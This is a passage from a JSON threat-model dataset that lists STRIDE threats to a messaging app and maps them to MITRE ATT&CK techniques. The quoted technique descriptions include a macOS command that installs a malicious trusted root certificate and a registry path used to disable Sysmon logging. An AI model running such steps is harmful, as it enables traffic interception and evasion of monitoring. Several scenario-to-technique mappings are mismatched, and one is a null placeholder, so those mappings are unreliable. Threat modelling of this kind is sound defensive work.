            "Scenario": "An attacker manipulates timestamp data on messages to disrupt the message chronology.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access and modify timestamp data.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to modify message data."
                },
                {
                    "Assumption": "The application does not protect message metadata adequately.",
                    "Role": "Application",
                    "Condition": "Weak encryption or integrity checks on metadata."
                },
                {
                    "Assumption": "Users rely on timestamps to verify message sequences.",
                    "Role": "User",
                    "Condition": "Dependence on chronological message order."
                }
            ],
            "Potential Impact": "Disruption of message order leading to confusion and disputes.",
            "MITRE ATT&CK Keywords": [
                "timestamp manipulation",
                "metadata tampering",
                "chronology disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users use fake digital signatures to deny transactions or message deliveries.",
            "Assumptions": [
                {
                    "Assumption": "The application accepts digital signatures without verification.",
                    "Role": "Application",
                    "Condition": "Lack of signature verification mechanisms."
                },
                {
                    "Assumption": "Users generate or use fake digital signatures.",
                    "Role": "User",
                    "Condition": "Availability of tools to forge digital signatures."
                },
                {
                    "Assumption": "The application does not log detailed digital signature data.",
                    "Role": "Application",
                    "Condition": "No comprehensive logging mechanisms for digital signatures."
                }
            ],
            "Potential Impact": "Inability to verify the authenticity of messages and transactions.",
            "MITRE ATT&CK Keywords": [
                "digital signature forgery",
                "transaction denial",
                "signature verification"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits vulnerabilities in the SQLite database to access stored messages and pre-keys.",
            "Assumptions": [
                {
                    "Assumption": "The attacker gains local access to the device.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote control over the device."
                },
                {
                    "Assumption": "The database is improperly secured.",
                    "Role": "Application",
                    "Condition": "Weak or non-existent encryption on the SQLite database."
                },
                {
                    "Assumption": "Attacker has knowledge of SQLite vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Technical understanding of how to exploit known database vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive stored message data and keys.",
            "MITRE ATT&CK Keywords": [
                "database exploit",
                "data breach",
                "access control"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Eavesdropping on network traffic allows an attacker to capture unencrypted session data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to the same network or can perform man-in-the-middle attacks."
                },
                {
                    "Assumption": "Not all network traffic is adequately encrypted.",
                    "Role": "Application",
                    "Condition": "Certain types of network traffic lack proper encryption."
                },
                {
                    "Assumption": "Users do not use secure networks.",
                    "Role": "User",
                    "Condition": "Users connect through public or vulnerable Wi-Fi networks."
                }
            ],
            "Potential Impact": "Capture of sensitive session data leading to potential exploitation.",
            "MITRE ATT&CK Keywords": [
                "eavesdropping",
                "session hijacking",
                "network interception"
            ],
            "mitre_technique": {
                "name": "Browser Session Hijacking",
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
                "technique_id": "T1185"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to backup files containing unencrypted user messages.",
            "Assumptions": [
                {
                    "Assumption": "The attacker accesses the backup files.",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to backup storage locations."
                },
                {
                    "Assumption": "Backup files are not encrypted.",
                    "Role": "Application",
                    "Condition": "Lack of encryption on backup files."
                },
                {
                    "Assumption": "Users do not secure backup locations.",
                    "Role": "User",
                    "Condition": "Backup files stored in insecure locations."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data from backups.",
            "MITRE ATT&CK Keywords": [
                "backup exploit",
                "data leakage",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the application with requests, causing service disruption.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can send an overwhelming number of requests.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or similar means for large-scale request generation."
                },
                {
                    "Assumption": "The application cannot handle a high volume of requests.",
                    "Role": "Application",
                    "Condition": "Lack of adequate request rate limiting."
                },
                {
                    "Assumption": "Users rely on application availability.",
                    "Role": "User",
                    "Condition": "Dependence on continuous service availability."
                }
            ],
            "Potential Impact": "Temporary unavailability of the messaging service.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "service disruption",
                "request flooding"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits software vulnerabilities to crash the application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker discovers and exploits unpatched vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Access to and knowledge of software vulnerabilities."
                },
                {
                    "Assumption": "The application has known undocumented vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Presence of vulnerabilities not addressed by recent updates."
                },
                {
                    "Assumption": "Users depend on uninterrupted service.",
                    "Role": "User",
                    "Condition": "Reliance on availability of messaging services."
                }
            ],
            "Potential Impact": "Service interruption and potential data loss.",
            "MITRE ATT&CK Keywords": [
                "crash exploit",
                "software vulnerability",
                "system shutdown"
            ],
            "mitre_technique": {
                "name": "System Shutdown/Reboot",
                "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>reload</code>).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A)\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)",
                "id": "attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc",
                "technique_id": "T1529"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Compromised companion devices are used to overwhelm the primary device with sync requests.",
            "Assumptions": [
                {
                    "Assumption": "The attacker compromises companion devices.",
                    "Role": "Attacker",
                    "Condition": "Ability to control multiple companion devices."
                },
                {
                    "Assumption": "The primary device cannot handle excessive sync requests.",
                    "Role": "Application",
                    "Condition": "Inadequate handling of sync request loads."
                },
                {
                    "Assumption": "Users have multiple linked companion devices.",
                    "Role": "User",
                    "Condition": "Reliance on companion devices for messaging."
                }
            ],
            "Potential Impact": "Primary device becomes unresponsive.",
            "MITRE ATT&CK Keywords": [
                "compromised device",
                "sync request flood",
                "device overload"
            ],
            "mitre_technique": {
                "name": "Multi-hop Proxy",
                "description": "Adversaries may chain together multiple proxies to disguise the source of malicious traffic. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.\n\nFor example, adversaries may construct or use onion routing networks \u2013 such as the publicly available [Tor](https://attack.mitre.org/software/S0183) network \u2013 to transport encrypted C2 traffic through a compromised population, allowing communication with any device within the network.(Citation: Onion Routing)\n\nIn the case of network infrastructure, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain (i.e., [Network Devices](https://attack.mitre.org/techniques/T1584/008)). By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001) on routers, adversaries can add custom code to the affected network devices that will implement onion routing between those nodes. This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method allowing the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\u2019s Wide-Area Network (WAN).  Protocols such as ICMP may be used as a transport.\n\nSimilarly, adversaries may abuse peer-to-peer (P2P) and blockchain-oriented infrastructure to implement routing between a decentralized network of peers.(Citation: NGLite Trojan)",
                "id": "attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d",
                "technique_id": "T1090.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges by exploiting vulnerabilities in the desktop client.",
            "Assumptions": [
                {
                    "Assumption": "The attacker identifies and exploits privilege escalation vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Access to exploitable vulnerabilities in the desktop client."
                },
                {
                    "Assumption": "The desktop client contains unpatched or zero-day vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Presence of unaddressed privilege escalation vulnerabilities."
                },
                {
                    "Assumption": "Users run the desktop client with sensitive data access.",
                    "Role": "User",
                    "Condition": "Sensitive data accessible by the desktop client."
                }
            ],
            "Potential Impact": "Unauthorized access to high-level functions and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "desktop client"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses malware to gain root access to the primary device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can install malware on the primary device.",
                    "Role": "Attacker",
                    "Condition": "Ability to deliver and execute malware on target device."
                },
                {
                    "Assumption": "The device has unpatched vulnerabilities that allow root access.",
                    "Role": "Application",
                    "Condition": "Presence of critical unpatched operating system vulnerabilities."
                },
                {
                    "Assumption": "Users install applications without sufficient security checks.",
                    "Role": "User",
                    "Condition": "Lack awareness and cautious behavior when installing apps."
                }
            ],
            "Potential Impact": "Complete control over the device, accessing all data and functions.",
            "MITRE ATT&CK Keywords": [
                "root access",
                "malware",
                "device control"
            ],
            "mitre_technique": {
                "name": "Rootkit",
                "description": "Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
                "id": "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b",
                "technique_id": "T1014"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits the update mechanism to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept or modify the update mechanism.",
                    "Role": "Attacker",
                    "Condition": "Ability to perform man-in-the-middle attacks during updates."
                },
                {
                    "Assumption": "The application does not adequately secure the update process.",
                    "Role": "Application",
                    "Condition": "Lack of encryption or integrity checks during updates."
                },
                {
                    "Assumption": "Users rely on the application\u2019s automatic update feature.",
                    "Role": "User",
                    "Condition": "Automatic updates without manual verification."
                }
            ],
            "Potential Impact": "Elevated privileges leading to unauthorized access and system control.",
            "MITRE ATT&CK Keywords": [
                "update exploitation",
                "man-in-the-middle",
                "update mechanism"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "27",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate user by creating a duplicate website mimicking the messaging application's authentication portal. Users unknowingly enter their private keys, believing they are accessing the legitimate service.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to phishing attacks.",
                    "Role": "User",
                    "Condition": "Belief in legitimacy of spoofed site"
                },
                {
                    "Assumption": "Attackers can create convincing doppelganger websites.",
                    "Role": "Attacker",
                    "Condition": "Technical proficiency"
                },
                {
                    "Assumption": "Users rely solely on the authenticity of the visual presentation.",
                    "Role": "User",
                    "Condition": "Lack of anti-phishing training"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data, disruption of service integrity and potential leakage of confidential information.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Phishing",
                "Credential Harvesting",
                "Social Engineering"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and manipulates the initial account setup process, using social engineering techniques to gain access to the generated identity keys.",
            "Assumptions": [
                {
                    "Assumption": "Users complete initial setup without verifying identity key generation.",
                    "Role": "User",
                    "Condition": "Lack of verification steps"
                },
                {
                    "Assumption": "Attackers can intercept communication between the user and the server.",
                    "Role": "Attacker",
                    "Condition": "Access to network"
                },
                {
                    "Assumption": "Users trust initial setup prompts without suspicion.",
                    "Role": "User",
                    "Condition": "Trust in system messages"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of initial identity keys, compromising the confidentiality and integrity of future communications.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Initial Access",
                "Social Engineering",
                "Network Interception"
            ],
            "mitre_technique": {
                "name": "Gather Victim Identity Information",
                "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "id": "attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4",
                "technique_id": "T1589"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains physical access to a logged-in desktop client and generates new identity keys, posing as the legitimate user across all linked devices.",
            "Assumptions": [
                {
                    "Assumption": "Desktop clients are left unattended and logged in.",
                    "Role": "User",
                    "Condition": "Lack of physical security practices"
                },
                {
                    "Assumption": "Attackers have physical access to the desktop client.",
                    "Role": "Attacker",
                    "Condition": "Access to the target environment"
                },
                {
                    "Assumption": "Users rely solely on digital security measures.",
                    "Role": "User",
                    "Condition": "Neglect of physical security"
                }
            ],
            "Potential Impact": "Compromise of user identity, unauthorized access to all linked devices, and disclosure of sensitive communications.",
            "MITRE ATT&CK Keywords": [
                "Spoofing",
                "Physical Access",
                "Identity Theft",
                "Device Manipulation"
            ],
            "mitre_technique": {
                "name": "User Execution",
                "description": "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary; running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s; or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204).(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nFor example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",
